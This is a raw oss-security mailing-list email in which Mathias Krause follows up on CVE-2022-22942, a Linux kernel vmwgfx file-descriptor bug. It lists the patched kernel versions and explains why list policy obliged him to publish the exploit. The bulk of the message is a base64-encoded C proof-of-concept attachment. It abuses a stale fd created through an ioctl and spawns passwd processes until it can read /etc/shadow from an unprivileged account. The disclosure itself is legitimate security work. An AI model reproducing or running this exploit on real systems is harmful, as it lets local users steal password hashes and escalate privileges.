X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["12804" "Thursday" "3" "February" "2022" "11:18:11" "+0100" "Mathias Krause" "minipli@grsecurity.net" nil "240" "[oss-security] Re: CVE-2022-22942: Linux kernel: wrong file descriptor handling in the vmwgfx driver" nil nil nil "2" nil nil (number mark "U       minipli@grse Feb  3  240/12804 " thread-indent "\"[oss-security] Re: CVE-2022-22942: Linux kernel: wrong file descriptor handling in the vmwgfx driver\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: CVE-2022-22942: Linux kernel: wrong file descriptor handling in the vmwgfx driver" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9555 invoked by uid 550); 3 Feb 2022 10:18:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9534 invoked from network); 3 Feb 2022 10:18:25 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=grsecurity.net; s=grsec;
        h=message-id:date:mime-version:user-agent:subject:content-language:to
         :references:from:in-reply-to;
        bh=OhjHJOXbvOQvqFRmY/YlDiSIB8V4Ieodqs+NtsbE0h8=;
        b=t1kOQqzRj6oE/g6lvnepFKI7IayKinnqUOdn4bHiwyLzfSdVG+i/BWONbNMyDZ9Yp/
         ZwNK2mUgMdt6rIsDUOa8HzlhqAssDiIEAlJgC6ESf9l1OoOwFPq2AOrdq8pY38aeSoeF
         7lAFJwBKDEXzWy7Hf9RbiEa81t4M2zo/qR3gAhwOI7hKQvk3YZ5iEg2lGz4tguoBxhHU
         uTHX1nekHRbffJDeJSIJI93mdRuOuH7aoIlAvaTJZHTL5QJMsvbXp/KbAkT1yNFidW5h
         JPxjsmA9rD0LlFuSkMLeN2lbBjISnU16Npbb/oFwFmedD8Z3Giz96/SNvyrjMbq5disw
         mmwA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:message-id:date:mime-version:user-agent:subject
         :content-language:to:references:from:in-reply-to;
        bh=OhjHJOXbvOQvqFRmY/YlDiSIB8V4Ieodqs+NtsbE0h8=;
        b=PVhZfwl6U8qEZmL9QkBwCqivoPSHKBnIUI8pTe0sgsNEkJpjAMBg2Dlh+/obvUP/st
         SQuskxq/446XTjKyt7r/KR+jgm9bogBh0eib+mJCxLo19gjUf6Jp6vDyIxznOfeABSOK
         Onfqs+DIBYWQ3AoBxIOzctliW26635d7s3KBrAMuyCtQBn7y+Jkc48FSl9VtNMqizqHM
         vUb0MiA9wqx5pl7AtVu1zfh6pzTgnb2Gi7qTJ5ioEQWPazfQu9s3FMrEnu6CTu0ZqFuW
         LjkBnHScWHbhYPvLjMepoJfsTjZaxqvcbtXZDr55AS8gQg9cZjl3cHy538/Z9UTNorSa
         rBJQ==
X-Gm-Message-State: AOAM5326GDAEn607EEuNjorAqhcHKem5PRSX0CNN7E7TgEzcupSYh1x9
	juNG3Fg2fQ3SvbdU5FTHrws0NIUnSJaWow==
X-Google-Smtp-Source: ABdhPJzUpI5TK6u3WmdwDdVJOc27olUj4k/uARnh+QMJYUpwFUBxlBLw4GXpb3sPFX2y1jUrvDzozQ==
X-Received: by 2002:a5d:570a:: with SMTP id a10mr28799919wrv.449.1643883493645;
        Thu, 03 Feb 2022 02:18:13 -0800 (PST)
Message-ID: <69b19982-5ed2-77be-40c7-8a236d1ac4bf@grsecurity.net>
Date: Thu, 3 Feb 2022 11:18:11 +0100
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
 Thunderbird/91.5.0
Content-Language: en-US
To: oss-security@lists.openwall.com
References: <0f115734-5e21-8fa9-7e96-f8636788a0bc@grsecurity.net>
 <77daef92-54bb-4c5c-cea2-c489e46d9027@grsecurity.net>
From: Mathias Krause <minipli@grsecurity.net>
In-Reply-To: <77daef92-54bb-4c5c-cea2-c489e46d9027@grsecurity.net>
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="------------3uV1zDNLkcAQLLF6kFYm1dhG"
Subject: [oss-security] Re: CVE-2022-22942: Linux kernel: wrong file descriptor handling in
 the vmwgfx driver

--------------3uV1zDNLkcAQLLF6kFYm1dhG
Content-Type: multipart/mixed; boundary="------------a67LWHPtuUKd29caHD0SG0Kx";
 protected-headers="v1"
From: Mathias Krause <minipli@grsecurity.net>
To: oss-security@lists.openwall.com
Message-ID: <69b19982-5ed2-77be-40c7-8a236d1ac4bf@grsecurity.net>
Subject: Re: CVE-2022-22942: Linux kernel: wrong file descriptor handling in
 the vmwgfx driver
References: <0f115734-5e21-8fa9-7e96-f8636788a0bc@grsecurity.net>
 <77daef92-54bb-4c5c-cea2-c489e46d9027@grsecurity.net>
In-Reply-To: <77daef92-54bb-4c5c-cea2-c489e46d9027@grsecurity.net>

--------------a67LWHPtuUKd29caHD0SG0Kx
Content-Type: multipart/mixed; boundary="------------qV005X0BKoohn2UIb0GzRffu"

--------------qV005X0BKoohn2UIb0GzRffu
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Good Morning!

Am 27.01.22 um 23:20 schrieb Mathias Krause:
> Am 27.01.22 um 21:00 schrieb Mathias Krause:
>> Exploiting this vulnerability requires an attacker to have access to
>> either /dev/dri/card0 or /dev/dri/rendererD128 and be able to issue an
>> ioctl() on the resulting file descriptor.
>=20
> Forgot to mention, as per linux-distros' list policy, an exploit for the
> vulnerability will be provided in 7 days, as one has been shared with
> the linux-distros before.
>=20
> Meanwhile the patch was merged into Linux mainline:
> https://git.kernel.org/linus/a0f90c881570

It's now also part of the following kernels:
v4.14.264: commit e8d092a62449
v4.19.227: commit 0008a0c78fc3
v5.4.175: commit 84b1259fe36a
v5.10.95: commit 77656fde3c01
v5.15.18: commit 6066977961fc
v5.16.4: commit 1d833b27fb70

Attached is the exploit, as demanded by the linux-distros mailing list
policy.

We did not intend to be providing this exploit, especially not within 7
days of disclosure, however when reporting this issue privately to
linux-distros and asked to provide the exploit I developed, I did not
realize that the mailing list rules
(https://oss-security.openwall.org/wiki/mailing-lists/distros) require
the public posting of the exploit no later than I am providing it now.
While the requirement does serve the useful purpose of ensuring the
private list doesn't become a stockpile of private exploits, we
encourage others to please read the rules of the list fully before
submitting and consider sharing exploits with individual members rather
than to the list as a whole so as to avoid being forced to publish an
exploit that in some instances may do more harm than good.

Thanks,
Mathias=

--------------qV005X0BKoohn2UIb0GzRffu
Content-Type: text/x-csrc; charset=UTF-8; name="vmwgfx.c"
Content-Disposition: attachment; filename="vmwgfx.c"
Content-Transfer-Encoding: base64

LyogVGhlIHZtd2dmeCBkcml2ZXIgaGFzIGEgc2ltaWxhciBidWcgYXMgdGhl
IG9uZSB3ZSBmaXhlZCBsYXN0IHllYXIgaW4gdGhlCiAqIG5pdHJvIGVuY2xh
dmVzIGNvZGUgKGh0dHBzOi8vZ2l0Lmtlcm5lbC5vcmcvbGludXMvZjFjZTM5
ODZiYWE2CiAqICJuaXRyb19lbmNsYXZlczogRml4IHN0YWxlIGZpbGUgZGVz
Y3JpcHRvcnMgb24gZmFpbGVkIHVzZXJjb3B5IikuCiAqCiAqIElmIHRoZSBk
cml2ZXIgZmFpbHMgdG8gY29weSB0aGUgJ2ZlbmNlX3JlcCcgb2JqZWN0IHRv
IHVzZXJsYW5kLCBpdCB0cmllcyB0bwogKiByZWNvdmVyIGJ5IGRlYWxsb2Nh
dGluZyB0aGUgKGFscmVhZHkgcG9wdWxhdGVkKSBmaWxlIGRlc2NyaXB0b3Iu
IFRoaXMgaXMKICogd3JvbmcsIGFzIHRoZSBmZCBnZXRzIHJlbGVhc2VkIHZp
YSBwdXRfdW51c2VkX2ZkKCkgd2hpY2ggc2hvdWxkbid0IGJlIHVzZWQsCiAq
IGFzIHRoZSBmZCB0YWJsZSBzbG90IHdhcyBhbHJlYWR5IHBvcHVsYXRlZCB2
aWEgdGhlIHByZXZpb3VzIGNhbGwgdG8KICogZmRfaW5zdGFsbCgpLiBUaGlz
IGxlYXZlcyB1c2VybGFuZCB3aXRoIGEgdmFsaWQgZmQgdGFibGUgZW50cnkg
cG9pbnRpbmcgdG8KICogYSBmcmVlJ2QgJ2ZpbGUnIG9iamVjdC4KICoKICog
VGhlcmUgYXJlIG11bHRpcGxlIHdheXMgdG8gZXhwbG9pdCB0aGlzIGJ1ZyBi
dXQgd2Ugc2ltcGx5ICJzcGFtIiBsb3RzIG9mCiAqIChyZS0pYWxsb2NhdGlv
bnMgb2YgdGhlIGRhbmdsaW5nICdmaWxlJyBvYmplY3QgdW50aWwgaXQgcG9p
bnRzIHRvIGFuCiAqIGludGVyZXN0aW5nIGZpbGU7IC9ldGMvc2hhZG93IGZv
ciB0aGlzIFBvQy4KICoKICogQ29tcGlsZSBhczoKICogICAkIGdjYyB2bXdn
ZnguYyAtbyB2bXdnZngKICoKICogUnVuIGFzIChhbmQgd2FpdCBmb3IgdGhl
IGNvbnRlbnQgb2YgL2V0Yy9zaGFkb3cgdG8gYXBwZWFyKToKICogICAkIC4v
dm13Z2Z4CiAqCiAqIFJlbWFya3M6CiAqCiAqIFRoaXMgUE9DIGFzc3VtZXMg
aXQgaGFzIGFjY2VzcyB0byAnL2Rldi9kcmkvY2FyZDAnIHdoaWNoIGxpa2Vs
eSBtZWFucyB0aGUKICogY2FsbGluZyB1c2VyIG5lZWRzIHRvIGJlIHBhcnQg
b2YgdGhlICd2aWRlbycgZ3JvdXAuCiAqCiAqIEFsdGVybmF0aXZlbHkgJy9k
ZXYvZHJpL3JlbmRlckQxMjgnIGNhbiBiZSB1c2VkIChqdXN0IHBhc3MgdGhl
IHBhdGggYXMKICogYXJndW1lbnQgdG8gLi92bXdnZngpLCB3aGljaCBtZWFu
cyBiZWluZyBwYXJ0IG9mIHRoZSAncmVuZGVyJyBncm91cC4KICoKICogKGMp
IDIwMjIgT3BlbiBTb3VyY2UgU2VjdXJpdHksIEluYy4gQWxsIFJpZ2h0cyBS
ZXNlcnZlZC4KICoKICogLSBtaW5pcGxpCiAqLwojaW5jbHVkZSA8c3lzL3N5
c21hY3Jvcy5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxz
eXMvaW9jdGwuaD4KI2luY2x1ZGUgPHN5cy9wcmN0bC5oPgojaW5jbHVkZSA8
c3lzL3N0YXQuaD4KI2luY2x1ZGUgPHN5cy93YWl0Lmg+CiNpbmNsdWRlIDx1
bmlzdGQuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RkaW50
Lmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHNpZ25hbC5oPgoj
aW5jbHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRl
IDxzdGRpby5oPgojaW5jbHVkZSA8ZXJyLmg+CgovKiB1YXBpL2RybS9kcm0u
aCAqLwojZGVmaW5lIERSTV9JT0NUTF9CQVNFCQknZCcKI2RlZmluZSBEUk1f
SU9XKG5yLHR5cGUpCV9JT1coRFJNX0lPQ1RMX0JBU0UsbnIsdHlwZSkKI2Rl
ZmluZSBEUk1fSU9XUihucix0eXBlKQlfSU9XUihEUk1fSU9DVExfQkFTRSxu
cix0eXBlKQojZGVmaW5lIERSTV9DT01NQU5EX0JBU0UJMHg0MAoKI2RlZmlu
ZSBEUk1fSU9DVExfVkVSU0lPTglEUk1fSU9XUigweDAwLCBzdHJ1Y3QgZHJt
X3ZlcnNpb24pCnN0cnVjdCBkcm1fdmVyc2lvbiB7CglpbnQgdmVyc2lvbl9t
YWpvcjsKCWludCB2ZXJzaW9uX21pbm9yOwoJaW50IHZlcnNpb25fcGF0Y2hs
ZXZlbDsKCXNpemVfdCBuYW1lX2xlbjsKCWNoYXIgKm5hbWU7CglzaXplX3Qg
ZGF0ZV9sZW47CgljaGFyICpkYXRlOwoJc2l6ZV90IGRlc2NfbGVuOwoJY2hh
ciAqZGVzYzsKfTsKCi8qIHVhcGkvZHJtL3Ztd2dmeF9kcm0uaCAqLwojZGVm
aW5lIERSTV9WTVdfRVhFQ0JVRgkJCQkxMgojZGVmaW5lIERSTV9WTVdfRVhF
Q0JVRl9WRVJTSU9OCQkJMgojZGVmaW5lIERSTV9WTVdfRVhFQ0JVRl9GTEFH
X0VYUE9SVF9GRU5DRV9GRAkoMSA8PCAxKQojZGVmaW5lIERSTV9WTVdfSU5W
QUxJRF9DVFhfSE5ETAkJKC0xKQoKI2RlZmluZSBEUk1fSU9DVExfVk1XX0VY
RUNCVUYgXAoJIERSTV9JT1coRFJNX0NPTU1BTkRfQkFTRSArIERSTV9WTVdf
RVhFQ0JVRiwgc3RydWN0IGRybV92bXdfZXhlY2J1Zl9hcmcpCnN0cnVjdCBk
cm1fdm13X2V4ZWNidWZfYXJnIHsKCXVpbnQ2NF90IGNvbW1hbmRzOwoJdWlu
dDMyX3QgY29tbWFuZF9zaXplOwoJdWludDMyX3QgdGhyb3R0bGVfdXM7Cgl1
aW50NjRfdCBmZW5jZV9yZXA7Cgl1aW50MzJfdCB2ZXJzaW9uOwoJdWludDMy
X3QgZmxhZ3M7Cgl1aW50MzJfdCBjb250ZXh0X2hhbmRsZTsKCWludDMyX3Qg
aW1wb3J0ZWRfZmVuY2VfZmQ7Cn07CgoKI2RlZmluZSBGRU5DRV9SRVBfUFRS
CTB4NDIKI2RlZmluZSBWTVdHRlhfRFJWX05BTUUJInZtd2dmeCIKI2RlZmlu
ZSBWTVdHRlhfREVWCSIvZGV2L2RyaS9jYXJkMCIKI2RlZmluZSBOVUxMX0RF
VgkiL2Rldi9udWxsIgojZGVmaW5lIFZJQ1RJTV9GSUxFCSIvZXRjL3NoYWRv
dyIKI2RlZmluZSBWSUNUSU1fSEVMUEVSCSIvYmluL3Bhc3N3ZCIKI2RlZmlu
ZSBOVU1fUFJPQ1MJMTAKCmV4dGVybiBjaGFyICoqZW52aXJvbjsKCnN0YXRp
YyBkZXZfdCB2aWN0aW1fZGV2OwpzdGF0aWMgaW5vX3QgdmljdGltX2lubzsK
c3RhdGljIGludCBzdGFsZV9mZDsKCnN0YXRpYyB2b2lkIHBhc3N3ZF9zcGF3
bmVyKGludCBwaXBlX3JkLCBpbnQgcGlwZV93cikgewoJY2hhciAqYXJndltd
ID0geyBWSUNUSU1fSEVMUEVSLCAiLVMiLCBOVUxMIH07CglpbnQgcHJvY3Mg
PSAwOwoJY2hhciBjaDsKCglpZiAocHJjdGwoUFJfU0VUX1BERUFUSFNJRywg
U0lHS0lMTCwgMCwgMCwgMCkgPCAwKQoJCWVycigxLCAicHJjdGwoUFJfU0VU
X1BERUFUSFNJRykiKTsKCglpZiAod3JpdGUocGlwZV93ciwgIjEiLCAxKSA8
PSAwKQoJCWVycigxLCAiY2hpbGQ6IHdyaXRlKHBpcGUpIik7CgoJaWYgKHJl
YWQocGlwZV9yZCwgJmNoLCBzaXplb2YoY2gpKSA8PSAwKQoJCWVycigxLCAi
Y2hpbGQ6IHJlYWQocGlwZSkiKTsKCgkvKiBlbnN1cmUgdGhlIGZvcmtlZCBo
ZWxwZXIgc3RheXMgc2lsZW50ICovCgljbG9zZSgwKTsgY2xvc2UoMSk7IGNs
b3NlKDIpOwoKCWZvciAoOzspIHsKCQlzd2l0Y2ggKGZvcmsoKSkgewoJCQlj
YXNlIC0xOgoJCQkJdXNsZWVwKDEpOwoJCQkJYnJlYWs7CgkJCWNhc2UgMDoK
CQkJCWV4ZWN2ZShWSUNUSU1fSEVMUEVSLCBhcmd2LCBlbnZpcm9uKTsKCQkJ
CWV4aXQoMSk7CgkJCWRlZmF1bHQ6CgkJCQlwcm9jcysrOwoJCX0KCgkJaWYg
KHByb2NzID49IE5VTV9QUk9DUykgewoJCQlpZiAod2FpdChOVUxMKSA+IDAp
CgkJCQlwcm9jcy0tOwoJCQl3aGlsZSAod2FpdHBpZCgtMSwgTlVMTCwgV05P
SEFORykgPiAwKQoJCQkJcHJvY3MtLTsKCQl9Cgl9Cn0KCnN0YXRpYyB2b2lk
IGNoZWNrX2ZkKHZvaWQpIHsKCWNoYXIgYnVmWzY0ICogMTAyNF07CglzdHJ1
Y3Qgc3RhdCBzYjsKCglmb3IgKDs7KSB7CgkJdXNsZWVwKDEpOwoKCQlpZiAo
ZnN0YXQoc3RhbGVfZmQsICZzYikgIT0gMCkKCQkJY29udGludWU7CgovLwkJ
cHJpbnRmKCJbK10gZmQgJWQgcmVhbGxvY2F0ZWQgKGRldj0oJSN4LCUjeCks
IGlubz0lbHUsIHVpZD0ldSwgZ2lkPSV1KSFcbiIsCi8vCQkgICAgICAgc3Rh
bGVfZmQsIG1ham9yKHNiLnN0X2RldiksIG1pbm9yKHNiLnN0X2RldiksIHNi
LnN0X2lubywgc2Iuc3RfdWlkLCBzYi5zdF9naWQpOwoKCQlpZiAoc2Iuc3Rf
ZGV2ID09IHZpY3RpbV9kZXYgJiYgc2Iuc3RfaW5vID09IHZpY3RpbV9pbm8p
IHsKCQkJc2l6ZV90IGNudCA9IHByZWFkKHN0YWxlX2ZkLCBidWYsIHNpemVv
ZihidWYpLCAwKTsKCgkJCWlmIChjbnQgPiAwKSB7CgkJCQlwcmludGYoIlxu
WyRdIGdvdCBhY2Nlc3MgdG8gJyVzJyB2aWEgc3RhbGUgZmQgJWQ6XG4iLCBW
SUNUSU1fRklMRSwgc3RhbGVfZmQpOwoJCQkJcHJpbnRmKCIlcyIsIGJ1Zik7
CgoJCQkJZXhpdCgwKTsKCQkJfQoJCX0KCX0KfQoKaW50IG1haW4oaW50IGFy
Z2MsIGNoYXIgKiphcmd2KSB7CglzdGF0aWMgY2hhciBuYW1lWzI1Nl0sIGRh
dGVbMjU2XSwgZGVzY1syNTZdOwoJc3RhdGljIHN0cnVjdCBkcm1fdmVyc2lv
biBkcm1faW5mbyA9IHsKCQkubmFtZSA9IG5hbWUsIC5uYW1lX2xlbiA9IHNp
emVvZihuYW1lKSwKCQkuZGVzYyA9IGRlc2MsIC5kZXNjX2xlbiA9IHNpemVv
ZihkZXNjKSwKCQkuZGF0ZSA9IGRhdGUsIC5kYXRlX2xlbiA9IHNpemVvZihk
YXRlKSwKCX07CglzdGF0aWMgc3RydWN0IGRybV92bXdfZXhlY2J1Zl9hcmcg
ZXhlY19idWYgPSB7CgkJLnZlcnNpb24gPSBEUk1fVk1XX0VYRUNCVUZfVkVS
U0lPTiwKCQkuY29udGV4dF9oYW5kbGUgPSBEUk1fVk1XX0lOVkFMSURfQ1RY
X0hOREwsCgkJLmZsYWdzID0gRFJNX1ZNV19FWEVDQlVGX0ZMQUdfRVhQT1JU
X0ZFTkNFX0ZELAoJCS5mZW5jZV9yZXAgPSBGRU5DRV9SRVBfUFRSLAoJfTsK
CWNvbnN0IGNoYXIgKmRldl9wYXRoID0gVk1XR0ZYX0RFVjsKCWludCBwaXBl
c1syXVsyXTsKCXN0cnVjdCBzdGF0IHNiOwoJaW50IHZtd19mZDsKCWNoYXIg
Y2g7CgoJaWYgKGFyZ2MgPT0gMikKCSAgICBkZXZfcGF0aCA9IGFyZ3ZbMV07
CgoJcHJpbnRmKCJbfl0gdm13Z2Z4IHNldHVwIHVzaW5nICVzLi4uXG4iLCBk
ZXZfcGF0aCk7Cgl2bXdfZmQgPSBvcGVuKGRldl9wYXRoLCBPX1dST05MWSk7
CglpZiAodm13X2ZkIDwgMCkKCQllcnIoMSwgIm9wZW4oJXMpIiwgZGV2X3Bh
dGgpOwoKCWlmIChpb2N0bCh2bXdfZmQsIERSTV9JT0NUTF9WRVJTSU9OLCAm
ZHJtX2luZm8pICE9IDApCgkJZXJyKDEsICJpb2N0bChEUk1fSU9DVExfVkVS
U0lPTikgdW5leHBlY3RlZGx5IGZhaWxlZCIpOwoKCWlmIChzdHJjbXAoZHJt
X2luZm8ubmFtZSwgVk1XR0ZYX0RSVl9OQU1FKSAhPSAwKSB7CgkJZXJyeCgx
LCAid3JvbmcgZHJpdmVyLCBzaG91bGQgYmUgJyVzJyBidXQgaXMgJyVzJyIs
CgkJICAgICBWTVdHRlhfRFJWX05BTUUsIGRybV9pbmZvLm5hbWUpOwoJfQoJ
cHJpbnRmKCJbaV0gY29uZmlybWVkIHRvIGJlIHRhcmdldGluZyB0aGUgcmln
aHQgZHJpdmVyXG4iKTsKCglwcmludGYoIlt+XSBmb3JraW5nIGhlbHBlciBw
cm9jZXNzLi4uXG4iKTsKCWlmIChwaXBlKHBpcGVzWzBdKSA8IDAgfHwgcGlw
ZShwaXBlc1sxXSkgPCAwKQoJCWVycigxLCAicGlwZSgpIik7CgoJc3dpdGNo
IChmb3JrKCkpIHsKCQljYXNlICAwOiBwYXNzd2Rfc3Bhd25lcihwaXBlc1sw
XVswXSwgcGlwZXNbMV1bMV0pOwoJCWNhc2UgLTE6IGVycigxLCAiZm9yaygp
Iik7Cgl9CgoJLyogd2FpdCB0aWxsIHRoZSBjaGlsZCBpcyByZWFkeSB0byBl
bnN1cmUgcHJvcGVyIHByb2Nlc3MgcmVhcGluZyAqLwoJaWYgKHJlYWQocGlw
ZXNbMV1bMF0sICZjaCwgc2l6ZW9mKGNoKSkgPD0gMCkKCQllcnIoMSwgInBh
cmVudDogcmVhZChwaXBlKSIpOwoKCXByaW50ZigiW35dIGdhdGhlcmluZyBz
dGF0IGluZm8gb2YgJyVzJy4uLlxuIiwgVklDVElNX0ZJTEUpOwoJaWYgKHN0
YXQoVklDVElNX0ZJTEUsICZzYikgPCAwKQoJCWVycigxLCAic3RhdCglcyki
LCBWSUNUSU1fRklMRSk7CgoJdmljdGltX2RldiA9IHNiLnN0X2RldjsKCXZp
Y3RpbV9pbm8gPSBzYi5zdF9pbm87CgoJc3RhbGVfZmQgPSBvcGVuKE5VTExf
REVWLCBPX1JET05MWSk7CglpZiAoc3RhbGVfZmQgPCAwKQoJCWVycigxLCAi
b3BlbiglcykiLCBOVUxMX0RFVik7CgljbG9zZShzdGFsZV9mZCk7Cglwcmlu
dGYoIltpXSBwcmVkaWN0ZWQgZmVuY2UgZmQgPSAlZFxuIiwgc3RhbGVfZmQp
OwoKCXByaW50ZigiW35dIHNpZ25hbGluZyBoZWxwZXIgdG8gZ2V0IGJ1c3ku
Li5cbiIpOwoJaWYgKHdyaXRlKHBpcGVzWzBdWzFdLCAiMSIsIDEpIDwgMCkK
CQllcnIoMSwgIndyaXRlKHBpcGUpIik7CgoJcHJpbnRmKCJbfl0gdHJpZ2dl
cmluZyBmZW5jZSBmZCBleHBvcnQuLi5cbiIpOwoJaWYgKGlvY3RsKHZtd19m
ZCwgRFJNX0lPQ1RMX1ZNV19FWEVDQlVGLCAmZXhlY19idWYpICE9IDApCgkJ
ZXJyKDEsICJpb2N0bChEUk1fSU9DVExfVk1XX0VYRUNCVUYpIHVuZXhwZWN0
ZWRseSBmYWlsZWQiKTsKCgkvKiBldmFsdWF0ZSBzdGFsZSBmZCBpbiBhIHN1
YnByb2Nlc3MgdG8gaGFuZGxlIGtlcm5lbCBvb3BzZXMganVzdCBmaW5lICov
CglwcmludGYoIlt+XSBtb25pdG9yaW5nIHN0YWxlIGZkLi4uIik7CglmZmx1
c2goTlVMTCk7Cglmb3IgKDs7KSB7CgkJcGlkX3QgcGlkID0gZm9yaygpOwoJ
CWludCBzdGF0dXM7CgoJCXN3aXRjaCAocGlkKSB7CgkJCWNhc2UgIDA6IGNo
ZWNrX2ZkKCk7CgkJCWNhc2UgLTE6IHVzbGVlcCgxMCk7CgkJCQkgY29udGlu
dWU7CgkJfQoKCQlpZiAod2FpdHBpZChwaWQsICZzdGF0dXMsIDApIDwgMCkK
CQkJIGVycigxLCAid2FpdCgpIik7CgoJCWlmIChXSUZFWElURUQoc3RhdHVz
KSAmJiBXRVhJVFNUQVRVUyhzdGF0dXMpID09IDApCgkJCWJyZWFrOwoKCQlw
dXRjaGFyKCcrJyk7CgkJZmZsdXNoKE5VTEwpOwoJfQoKCXJldHVybiAwOwp9
Cg==

--------------qV005X0BKoohn2UIb0GzRffu--

--------------a67LWHPtuUKd29caHD0SG0Kx--

--------------3uV1zDNLkcAQLLF6kFYm1dhG
Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="OpenPGP_signature"

-----BEGIN PGP SIGNATURE-----

wsD5BAABCAAjFiEEd7J359B9wKgGsB94J4hPxYYBGYYFAmH7q+MFAwAAAAAACgkQJ4hPxYYBGYZJ
RAv/YkC3/QLViOf6yHMik4iCEu67KpEXpmXYxtgLa1vm2YrjbkRCUsVNTxgXtE162JzInjThopLd
abKY3WMih+9Q6iw9tXcNMxXHoNMsZ00RTbiHlrNDYzGyzH9Z+oCrSbvXMy7UQe+8YduT/wfggQ/S
mbzXmhRNAHCbefX60kNstwc3PntkhdUmDiIAqdVKoFiNTr9OL1xF8hLzr+jSpNkcDrPG6gVXbl5+
K9dOJouMkAOR63xwiqIJGpIoTYqdw+vuE9zypNHdOUqz8b+QBHJWqNJio5uNBYLrnBDrfI45dknv
QIRbvAZ/SXPh1YCAuUh/CYCfC9ZDqwGGqggMnsyUV7ssKoVuQItAbc+8uMJOJP7xBc2FjszuUA5/
SGrDQ/JqfSnbsOrXZi391pOnV57VssaC/lsPZVNMGbkItpV0lXDO+Vuwd+QGDKoiQzLMe71YoCBI
GIeiQeQJ/DIRQpvZaqL+UO9sAJPVffY61/F4Q3yYi5Wl9hHFLsrnfNSQoB3F
=SPIS
-----END PGP SIGNATURE-----

--------------3uV1zDNLkcAQLLF6kFYm1dhG--
